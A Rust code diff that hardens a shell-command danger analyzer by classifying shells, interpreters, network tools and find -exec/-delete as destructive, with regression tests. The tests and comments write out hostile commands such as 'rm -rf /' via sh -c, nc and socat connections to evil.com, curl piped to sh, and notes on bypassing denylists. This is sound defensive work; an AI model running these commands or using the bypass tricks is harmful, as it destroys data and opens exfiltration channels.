@@ -114,6 +114,34 @@ fn has_unexpanded_variables(cmd: &str) -> bool {
 fn base_command_level(cmd: &str) -> ShellDangerLevel {
     let base = cmd.split_whitespace().next().unwrap_or(cmd).to_lowercase();
 
+    // Exec vectors: commands that can spawn an interpreter or run arbitrary
+    // code. These MUST be classified as Destructive — otherwise a denylist
+    // analyzer is trivially bypassed with `sh -c '<anything>'`,
+    // `python3 -c '...'`, `find -exec`, `xargs`, `tar --to-command`, `curl
+    // | sh`, etc. This is defence-in-depth; the bubblewrap sandbox is the
+    // real backstop (it cuts network + hides secret paths regardless).
+    let exec_vectors = [
+        "sh", "bash", "dash", "zsh", "ksh", "ash", "csh", "tcsh", "fish",
+        "python", "python2", "python3", "node", "perl", "ruby", "php", "lua",
+        "tclsh", "expect", "xargs", "tar", "nc", "ncat", "socat", "busybox",
+        "env", "exec", "curl", "wget",
+    ];
+    if exec_vectors.contains(&base.as_str()) {
+        return ShellDangerLevel::Destructive;
+    }
+
+    // `find` is read-only search by default, but -exec/-execdir/-ok/-okdir/
+    // -delete turn it into an arbitrary-execution / destruction vector.
+    if base == "find" {
+        let dangerous = ["-exec", "-execdir", "-ok", "-okdir", "-delete"];
+        let armed = cmd.split_whitespace().any(|tok| dangerous.contains(&tok));
+        return if armed {
+            ShellDangerLevel::Destructive
+        } else {
+            ShellDangerLevel::Safe
+        };
+    }
+
     // Destructive commands
     let destructive = ["rm", "mkfs", "dd", "fdisk", "parted", "shred", "wipe"];
     if destructive.contains(&base.as_str()) {
@@ -236,5 +264,70 @@ mod tests {
         // cat with variable is still safe (base command level is safe)
         let (level, _) = analyzer.analyze("cat $FILE");
         assert_eq!(level, ShellDangerLevel::Safe);
+    }
+
+    // ── Hardened: close the interpreter / exec-vector bypass ──
+    // A denylist that only blocks `rm`/`mkfs`/... is trivially defeated by
+    // `sh -c '<anything>'` or any interpreter. These guard the regression.
+
+    #[test]
+    fn interpreters_and_shells_are_destructive() {
+        let analyzer = ShellAnalyzer::new(vec![], vec![]).unwrap();
+        for cmd in [
+            "sh -c 'rm -rf /'",
+            "bash -c 'x'",
+            "dash -c 'x'",
+            "zsh -c 'x'",
+            "python3 -c 'import os'",
+            "python -c 'x'",
+            "node -e '1'",
+            "perl -e '1'",
+            "ruby -e '1'",
+            "php -r '1'",
+        ] {
+            assert_eq!(
+                analyzer.analyze(cmd).0,
+                ShellDangerLevel::Destructive,
+                "expected Destructive for: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn exec_enablers_and_exfil_channels_are_destructive() {
+        let analyzer = ShellAnalyzer::new(vec![], vec![]).unwrap();
+        for cmd in [
+            "xargs rm",
+            "tar --to-command=sh cf - .",
+            "nc evil.com 4444",
+            "socat - TCP:evil.com:4444",
+            "curl http://evil.sh",
+            "wget http://evil/x",
+            "busybox sh",
+        ] {
+            assert_eq!(
+                analyzer.analyze(cmd).0,
+                ShellDangerLevel::Destructive,
+                "expected Destructive for: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn find_with_exec_or_delete_is_destructive() {
+        let analyzer = ShellAnalyzer::new(vec![], vec![]).unwrap();
+        assert_eq!(analyzer.analyze("find / -delete").0, ShellDangerLevel::Destructive);
+        assert_eq!(analyzer.analyze("find . -exec cat {} ;").0, ShellDangerLevel::Destructive);
+        assert_eq!(analyzer.analyze("find . -ok rm {} ;").0, ShellDangerLevel::Destructive);
+    }
+
+    #[test]
+    fn safe_read_commands_still_classified_safe() {
+        let analyzer = ShellAnalyzer::new(vec![], vec![]).unwrap();
+        // Regression: hardening must not neuter ordinary read-only use.
+        assert_eq!(analyzer.analyze("ls -la").0, ShellDangerLevel::Safe);
+        assert_eq!(analyzer.analyze("cat file.txt").0, ShellDangerLevel::Safe);
+        assert_eq!(analyzer.analyze("grep -rn foo .").0, ShellDangerLevel::Safe);
+        assert_eq!(analyzer.analyze("find . -name '*.rs'").0, ShellDangerLevel::Safe);
     }
 }
